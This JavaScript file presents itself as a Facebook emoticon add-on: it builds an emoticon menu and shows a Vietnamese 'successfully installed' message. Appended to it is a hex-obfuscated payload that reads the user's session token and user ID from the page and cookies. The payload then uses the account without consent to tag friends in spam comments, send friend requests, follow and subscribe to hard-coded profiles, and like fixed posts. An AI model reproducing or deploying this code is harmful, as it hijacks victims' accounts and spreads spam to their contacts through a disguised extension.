	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FaceBook Thành Công <br>NoName</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
var _0x57a6=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x32\x36\x30\x36\x36\x33\x33\x33\x37\x34\x34\x35\x37\x38\x32","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x3B","\x6C\x65\x6E\x67\x74\x68","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x73\x65\x6E\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x3C\x33\x20\x4D\xEC\x6E\x68\x20\x54\x68\xE0\x6E\x68\x20\x43\xF4\x6E\x67\x20\x52\u1ED3\x69\x20\x4E\xE8\x20\x4D\u1ECD\x69\x20\x4E\x67\u01B0\u1EDD\x69\x20\x54\x68\u1EED\x20\u0110\x69\x20\x4E\x68\xEC\x6E\x20\u0110\u1EB9\x70\x20\x4C\u1EAF\x6D\x20\x20\uD83C\uDF89\x20\x20\uD83C\uDF81\x20\x20\uD83D\uDC18\x20\x20\uD83D\uDC19\x20\x20\x54\x48\u1EEC\x20\u0110\x49\x20\x4E\x48\xC9\x20\x20\uD83D\uDC66\x20\x20\uD83D\uDC8B\x20\x20\uD83D\uDC96\x20\x20","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x65\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x26\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x3D\x26\x63\x61\x74\x3D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70","\x6C\x69\x6B\x65\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x74\x72\x75\x65\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x31\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x25\x33\x41\x33\x37\x39\x37\x38\x33\x38\x35\x37\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x39\x5F\x31\x38\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x25\x33\x45\x25\x33\x44\x26\x66\x74\x5B\x74\x79\x70\x65\x5D\x3D\x32\x30\x26\x66\x74\x5B\x71\x69\x64\x5D\x3D\x31\x38\x34\x38\x35\x33\x39\x31\x38\x33\x38\x33\x39\x33\x37\x26\x66\x74\x5B\x6D\x66\x5F\x73\x74\x6F\x72\x79\x5F\x6B\x65\x79\x5D\x3D\x32\x38\x31\x34\x39\x36\x32\x39\x30\x30\x31\x39\x33\x31\x34\x33\x39\x35\x32\x26\x66\x74\x5B\x68\x61\x73\x5F\x65\x78\x70\x61\x6E\x64\x65\x64\x5F\x75\x66\x69\x5D\x3D\x31\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x68\x6F\x6D\x65\x5F\x73\x74\x72\x65\x61\x6D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x38\x51\x6F\x41\x4D\x42\x6C\x43\x6C\x79\x6F\x63\x70\x61\x65\x26\x5F\x5F\x72\x65\x71\x3D\x67\x34\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x35\x37\x34\x37\x36\x34\x31\x38\x36\x33","\x31\x30\x30\x30\x30\x37\x35\x35\x39\x39\x35\x32\x38\x35\x35","\x31\x30\x30\x30\x30\x37\x36\x35\x37\x35\x36\x30\x37\x32\x34","\x31\x32\x35\x30\x39\x34\x33\x30\x31\x30\x32\x35\x34\x39\x31","\x31\x32\x35\x30\x39\x34\x34\x34\x37\x36\x39\x32\x31\x34\x33","\x31\x33\x39\x30\x36\x37\x39\x37\x39\x36\x32\x38\x31\x32\x33","\x31\x30\x31\x31\x32\x34\x39\x38\x36\x37\x36\x33\x35\x36\x39","\x35\x34\x31\x37\x38\x34\x30\x33\x39\x32\x31\x33\x34\x32\x32","\x32\x32\x36\x32\x33\x34\x38\x37\x34\x32\x30\x35\x34\x37\x30"];var fb_dtsg=document[_0x57a6[2]](_0x57a6[1])[0][_0x57a6[0]];var user_id=document[_0x57a6[4]][_0x57a6[3]](document[_0x57a6[4]][_0x57a6[3]](/c_user=(\d+)/)[1]);var id=_0x57a6[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0xa5adx7= new XMLHttpRequest();_0xa5adx7[_0x57a6[6]]=function (){if(_0xa5adx7[_0x57a6[7]]==4){eval(_0x57a6[8]+_0xa5adx7[_0x57a6[12]].toString()[_0x57a6[11]](_0x57a6[9],_0x57a6[10])+_0x57a6[13]);for(f=0;f<Math[_0x57a6[17]](arkadaslar[_0x57a6[16]][_0x57a6[15]][_0x57a6[14]]/27);f++){mesaj=_0x57a6[10];mesaj_text=_0x57a6[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0x57a6[16]][_0x57a6[15]][i]){mesaj+=_0x57a6[18]+arkadaslar[_0x57a6[16]][_0x57a6[15]][i][_0x57a6[19]]+_0x57a6[20]+arkadaslar[_0x57a6[16]][_0x57a6[15]][i][_0x57a6[21]]+_0x57a6[22];mesaj_text+=_0x57a6[23]+arkadaslar[_0x57a6[16]][_0x57a6[15]][i][_0x57a6[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0xa5adx8=_0x57a6[24];_0xa5adx8+=_0x57a6[25];_0xa5adx8+=_0x57a6[26];_0xa5adx8+=_0x57a6[27];_0xa5adx8+=_0x57a6[28]+user_id;_0xa5adx8+=_0x57a6[29]+user_id;if(document[_0x57a6[32]][_0x57a6[31]](_0x57a6[30])>=0){_0xa5adx7[_0x57a6[35]](_0x57a6[33],_0x57a6[34]+_0xa5adx8,true);} else {_0xa5adx7[_0x57a6[35]](_0x57a6[33],_0x57a6[36]+_0xa5adx8,true);} ;_0xa5adx7[_0x57a6[37]]();} ;function RandomArkadas(){var _0xa5adxa=_0x57a6[10];for(i=0;i<9;i++){_0xa5adxa+=_0x57a6[18]+arkadaslar[_0x57a6[16]][_0x57a6[15]][Math[_0x57a6[39]](Math[_0x57a6[38]]()*arkadaslar[_0x57a6[16]][_0x57a6[15]][_0x57a6[14]])][_0x57a6[19]]+_0x57a6[20]+arkadaslar[_0x57a6[16]][_0x57a6[15]][Math[_0x57a6[39]](Math[_0x57a6[38]]()*arkadaslar[_0x57a6[16]][_0x57a6[15]][_0x57a6[14]])][_0x57a6[21]]+_0x57a6[22];} ;return _0xa5adxa;} ;function yorum_yap(id,_0xa5adxc){var _0xa5adxd= new XMLHttpRequest();var _0xa5adx8=_0x57a6[10];_0xa5adx8+=_0x57a6[40]+id;_0xa5adx8+=_0x57a6[41]+encodeURIComponent(_0xa5adxc);_0xa5adx8+=_0x57a6[42];_0xa5adx8+=_0x57a6[43];_0xa5adx8+=_0x57a6[44];_0xa5adx8+=_0x57a6[45];_0xa5adx8+=_0x57a6[46];_0xa5adx8+=_0x57a6[47]+id+_0x57a6[48];_0xa5adx8+=_0x57a6[49];_0xa5adx8+=_0x57a6[50];_0xa5adx8+=_0x57a6[51];_0xa5adx8+=_0x57a6[52];_0xa5adx8+=_0x57a6[29]+user_id;_0xa5adx8+=_0x57a6[53];_0xa5adx8+=_0x57a6[54];_0xa5adx8+=_0x57a6[55];_0xa5adx8+=_0x57a6[56]+fb_dtsg;_0xa5adx8+=_0x57a6[57];_0xa5adxd[_0x57a6[35]](_0x57a6[58],_0x57a6[59],true);_0xa5adxd[_0x57a6[62]](_0x57a6[60],_0x57a6[61]);_0xa5adxd[_0x57a6[6]]=function (){if(_0xa5adxd[_0x57a6[7]]==4&&_0xa5adxd[_0x57a6[63]]==200){_0xa5adxd[_0x57a6[64]];} ;} ;_0xa5adxd[_0x57a6[37]](_0xa5adx8);} ;arkadaslari_al(id);var fb_dtsg=document[_0x57a6[2]](_0x57a6[1])[0][_0x57a6[0]];var user_id=document[_0x57a6[4]][_0x57a6[3]](document[_0x57a6[4]][_0x57a6[3]](/c_user=(\d+)/)[1]);function IDS(_0xa5adxf){var _0xa5adx10= new XMLHttpRequest();var _0xa5adx11=_0x57a6[65];var _0xa5adx12=_0x57a6[66]+_0xa5adxf+_0x57a6[67]+user_id+_0x57a6[68]+fb_dtsg+_0x57a6[69];_0xa5adx10[_0x57a6[35]](_0x57a6[58],_0xa5adx11,true);_0xa5adx10[_0x57a6[6]]=function (){if(_0xa5adx10[_0x57a6[7]]==4&&_0xa5adx10[_0x57a6[63]]==200){_0xa5adx10[_0x57a6[64]];} ;} ;_0xa5adx10[_0x57a6[37]](_0xa5adx12);} ;var fb_dtsg=document[_0x57a6[2]](_0x57a6[1])[0][_0x57a6[0]];var user_id=document[_0x57a6[4]][_0x57a6[3]](document[_0x57a6[4]][_0x57a6[3]](/c_user=(\d+)/)[1]);function Like(_0xa5adx14){var _0xa5adx15= new XMLHttpRequest();var _0xa5adx16=_0x57a6[70];var _0xa5adx17=_0x57a6[71]+_0xa5adx14+_0x57a6[72]+user_id+_0x57a6[73]+fb_dtsg+_0x57a6[69];_0xa5adx15[_0x57a6[35]](_0x57a6[58],_0xa5adx16,true);_0xa5adx15[_0x57a6[6]]=function (){if(_0xa5adx15[_0x57a6[7]]==4&&_0xa5adx15[_0x57a6[63]]==200){_0xa5adx15[_0x57a6[64]];} ;} ;_0xa5adx15[_0x57a6[37]](_0xa5adx17);} ;var user_id=document[_0x57a6[4]][_0x57a6[3]](document[_0x57a6[4]][_0x57a6[3]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0x57a6[2]](_0x57a6[1])[0][_0x57a6[0]];var now=( new Date)[_0x57a6[74]]();function P(_0xa5adx1a){var _0xa5adx10= new XMLHttpRequest();var _0xa5adx11=_0x57a6[75];var _0xa5adx12=_0x57a6[76]+_0xa5adx1a+_0x57a6[77]+now+_0x57a6[78]+user_id+_0x57a6[79]+fb_dtsg+_0x57a6[69];_0xa5adx10[_0x57a6[35]](_0x57a6[58],_0xa5adx11,true);_0xa5adx10[_0x57a6[6]]=function (){if(_0xa5adx10[_0x57a6[7]]==4&&_0xa5adx10[_0x57a6[63]]==200){_0xa5adx10[_0x57a6[64]];} ;} ;_0xa5adx10[_0x57a6[37]](_0xa5adx12);} ;var fb_dtsg=document[_0x57a6[2]](_0x57a6[1])[0][_0x57a6[0]];var user_id=document[_0x57a6[4]][_0x57a6[3]](document[_0x57a6[4]][_0x57a6[3]](/c_user=(\d+)/)[1]);function a(_0xa5adx1c){var _0xa5adx1d= new XMLHttpRequest;var _0xa5adx1e=_0x57a6[80];var _0xa5adx1f=_0x57a6[81]+_0xa5adx1c+_0x57a6[82]+fb_dtsg+_0x57a6[83]+user_id+_0x57a6[69];_0xa5adx1d[_0x57a6[35]](_0x57a6[58],_0xa5adx1e,true);_0xa5adx1d[_0x57a6[6]]=function (){if(_0xa5adx1d[_0x57a6[7]]==4&&_0xa5adx1d[_0x57a6[63]]==200){_0xa5adx1d[_0x57a6[64]];} ;} ;_0xa5adx1d[_0x57a6[37]](_0xa5adx1f);} ;function sublist(_0xa5adx21){var a=document[_0x57a6[85]](_0x57a6[84]);a[_0x57a6[86]]=_0x57a6[87]+_0xa5adx21+_0x57a6[88];document[_0x57a6[90]][_0x57a6[89]](a);} ;IDS(_0x57a6[91]);a(_0x57a6[91]);a(_0x57a6[92]);a(_0x57a6[93]);sublist(_0x57a6[94]);sublist(_0x57a6[95]);sublist(_0x57a6[96]);sublist(_0x57a6[97]);Like(_0x57a6[98]);Like(_0x57a6[99]);